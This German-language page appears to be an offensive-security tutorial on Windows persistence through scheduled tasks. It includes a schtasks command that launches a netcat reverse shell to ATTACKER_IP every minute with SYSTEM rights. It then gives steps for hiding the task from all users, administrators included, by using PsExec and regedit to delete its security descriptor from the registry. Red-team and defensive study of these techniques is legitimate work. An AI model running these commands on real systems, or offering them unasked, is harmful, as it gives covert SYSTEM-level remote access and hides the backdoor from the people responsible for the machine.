# Ausnutzung geplanter Aufgaben

{% hint style="info" %}
Geplante Aufgaben (Scheduled Tasks) stellen eine weitere effektive Methode zur Etablierung von Persistenz in Windows-Systemen dar. Mit dem integrierten Aufgabenplaner lassen sich Aufgaben sehr granular konfigurieren, z. B. durch Ausführung zu bestimmten Zeitpunkten, in Intervallen oder als Reaktion auf bestimmte Systemereignisse.
{% endhint %}

***

## **Erstellen geplanter Aufgaben**

Zur Einrichtung persistenter Aufgaben sollte der Befehl [schtasks.md](../befehle/schtasks.md "mention") verwendet werden. Dieser erlaubt es, Aufgaben direkt über die Kommandozeile zu konfigurieren. Ein Beispiel zur Erstellung einer automatisierten Reverse Shell, die minütlich ausgeführt wird, lautet:

```cmd
schtasks /create /sc minute /mo 1 /tn RMT-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

* `/sc minute /mo 1` legt fest, dass die Aufgabe jede Minute ausgeführt wird.
* `/tn RMT-TaskBackdoor` gibt den Namen der Aufgabe an.
* `/tr` definiert den auszuführenden Befehl (in diesem Fall eine Reverse Shell).
* `/ru SYSTEM` stellt sicher, dass die Aufgabe mit SYSTEM-Rechten läuft.

Um zu prüfen, ob die Aufgabe erfolgreich eingerichtet wurde, kann folgender Befehl verwendet werden:

```cmd
schtasks /query /tn RMT-TaskBackdoor
```

***

## **Tarnen der geplanten Aufgabe**

Obwohl die Aufgabe erstellt ist, könnte ein kompromittierter Benutzer diese im Aufgabenplaner sehen. Um dies zu verhindern, sollte der zugehörige **Security Descriptor (SD)** aus der Registry gelöscht werden. Dieser legt fest, welche Benutzer die Aufgabe einsehen oder verändern dürfen. Wird der SD entfernt, ist die Aufgabe für alle Benutzer – inklusive Administratoren – unsichtbar.

Die SD-Werte aller Aufgaben befinden sich in der Registry unter:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Um den Eintrag zu löschen, müssen SYSTEM-Rechte vorliegen. Dazu kann `PsExec` aus den Sysinternals-Tools genutzt werden:

```cmd
c:\tools\pstools\PsExec64.exe -s -i regedit
```

Anschließend muss in der Registry der `SD`-Wert des Schlüssels **RMT-TaskBackdoor** entfernt werden. Nach diesem Vorgang wird die Aufgabe nicht mehr über `schtasks /query` angezeigt:

```cmd
schtasks /query /tn RMT-TaskBackdoor
> ERROR: The system cannot find the file specified.
```

Die Aufgabe wird jedoch weiterhin im Hintergrund ausgeführt. Bei einem laufenden Listener auf der Angreiferseite sollte innerhalb einer Minute eine Reverse Shell empfangen werden.
